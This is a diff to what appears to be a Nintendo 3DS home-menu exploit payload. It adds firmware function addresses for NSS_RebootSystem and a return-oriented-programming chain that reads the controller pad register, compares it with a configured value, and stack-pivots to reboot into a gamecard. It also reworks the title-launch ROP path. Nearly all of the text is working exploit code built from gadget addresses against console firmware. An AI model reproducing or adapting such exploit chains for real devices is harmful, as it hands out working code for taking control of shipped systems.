@@ -31,6 +31,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define GSPGPU_FlushDataCache 0x0014ab9c
 
 #define APT_SendParameter 0x00214ab0 //inr0=dst appid inr1=signaltype inr2=parambuf* inr3=parambufsize insp0=handle
+
+#define NSS_RebootSystem 0x00136a0c
 #else
 #define ROP_LOADR4_FROMOBJR0 0x10b64c
 #define ROP_POPPC 0x102028
@@ -42,6 +44,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define CFGIPC_SecureInfoGetRegion 0x00139d0c
 
 #define GSPGPU_Shutdown 0x0011da58
+
+#define NSS_RebootSystem 0x00139874
 #endif
 
 #if SYSVER == 93
@@ -363,6 +367,11 @@ nsslaunchtitle_programidlow_list:
 /*nss_servname:
 .ascii "ns:s"*/
 
+gamecard_titleinfo:
+.word 0, 0 @ programID
+.word 2 @ mediatype
+.word 0 @ reserved
+
 tmp_scratchdata:
 .space 0x400
 
@@ -420,13 +429,72 @@ CALL_GXCMD4 0x1f000000, 0x1f1e6000, 0x46800*2
 RET2MENUCODE
 #endif
 
+#ifdef BOOTGAMECARD
+#ifdef GAMECARD_PADCHECK
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word 3000000000//0x0 @ r0
+
+.word POP_R1PC
+.word 0x0//0x100 @ r1
+
+.word svcSleepThread @ Sleep 3 seconds, otherwise PADCHECK won't work if USE_PADCHECK and GAMECARD_PADCHECK are different values.
+
+.word POP_R0PC
+.word HEAPBUF + (rop_r0data_cmphid_gamecard - _start) @ r0
+
+.word POP_R1PC
+.word 0x1000001c @ r1
+
+.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from *0x1000001c to rop_r0data_cmphid, current HID PAD state.
+
+.word POP_R0PC
+rop_r0data_cmphid_gamecard:
+.word 0 @ r0
+
+.word POP_R1PC
+.word GAMECARD_PADCHECK @ r1
+
+.word ROP_CMPR0R1 @ Compare current PAD state with GAMECARD_PADCHECK value.
+
+.word HEAPBUF + ((object+0x20) - _start) @ r4
+
+.word POP_R0PC
+.word HEAPBUF + (stackpivot_sploadword - _start) @ r0
+
+.word POP_R1PC
+.word (HEAPBUF + (bootgamecard_ropfinish - _start)) @ r1
+
+.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.
+
+.word POP_R0PC
+.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0
+
+.word POP_R1PC
+.word ROP_POPPC @ r1
+
+.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.
+
+.word POP_R0PC @ Begin the actual stack-pivot ROP.
+.word HEAPBUF + (object - _start) @ r0
+
+.word ROP_LOADR4_FROMOBJR0+8 @ When the current PAD state matches the GAMECARD_PADCHECK value, continue the gamecard launch ROP, otherwise do the above stack-pivot to skip gamecard launch.
+
+.word 0, 0, 0 @ r4..r6
+#endif
+
+CALLFUNC_NOSP NSS_RebootSystem, 0x1, (HEAPBUF + (gamecard_titleinfo - _start)), 0x0, 0
+
+bootgamecard_ropfinish:
+#endif
+
 #if NEW3DS==1 //On New3DS the end-address of the GPU-accessible FCRAM area increased, relative to the SYSTEM-memregion end address. Therefore, in order to get the below process to run under memory that's GPU accessible, 0x400000-bytes are allocated here.
 CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata - _start)), 0x0f000000, 0, 0x00400000, 0x3, 0x3, 0, 0
 #endif
 
 CALLFUNC_NOSP GSPGPU_FlushDataCache, (HEAPBUF + (codedatastart - _start)), (codedataend-codedatastart), 0, 0
 
-#ifndef BOOTGAMECARD
 ROP_SETLR POP_R2R6PC
 
 .word POP_R0PC
@@ -453,7 +521,6 @@ ROP_SETLR_OTHER ROP_POPPC
 .word HEAPBUF + (nsslaunchtitle_regload_programidlow - _start) @ r0
 
 .word ROP_STR_R1TOR0 //Write the programID-low value for this region to the below reg-data which would be used for the programID-low in the NSS_LaunchTitle call.
-#endif
 
 ROP_SETLR POP_R2R6PC
 
@@ -465,28 +532,19 @@ ROP_SETLR POP_R2R6PC
 .word POP_R2R6PC
 nsslaunchtitle_regload_programidlow:
 .word 0 @ r2, programID low (overwritten by the above ROP)
-#ifndef BOOTGAMECARD
 .word 0x00040030 @ r3, programID high
-#else
-.word 0
-#endif
 .word 0 @ r4
 .word 0 @ r5
 .word 0 @ r6
 
 .word NSS_LaunchTitle @ Launch the web-browser.
 
-#ifndef BOOTGAMECARD
 .word 0 @ r2 / sp0 (mediatype, 0=NAND)
-#else
-.word 2
-#endif
 .word 0 @ r3
 .word 0 @ r4
 .word 0 @ r5
 .word 0 @ r6
 
-#ifndef BOOTGAMECARD
 #if NEW3DS==1//Use this as a waitbyloop.
 CALLFUNC ROP_INITOBJARRAY, 0, ROP_BXLR, 0, 0x10000000, 0, 0, 0, 0
 #endif
@@ -511,7 +569,6 @@ ROP_SETLR ROP_POPPC
 .word 0x0//0x100 @ r1
 
 .word svcSleepThread @ Sleep 1 second, call GSPGPU_Shutdown() etc, then execute svcSleepThread in an "infinite loop". The ARM11-kernel does not allow this homemenu thread and the browser thread to run at the same time(homemenu thread has priority over the browser thread). Therefore an "infinite loop" like the bx one below will result in execution of the browser thread completely stopping once any homemenu "infinite loop" begin execution. On Old3DS this means the below code will overwrite .text while the browser is attempting to clear .bss. On New3DS since overwriting .text+0 doesn't quite work(context-switching doesn't trigger at the right times), a different location in .text has to be overwritten instead.
-#endif
 
 CALLFUNC_NOARGS GSPGPU_Shutdown
 
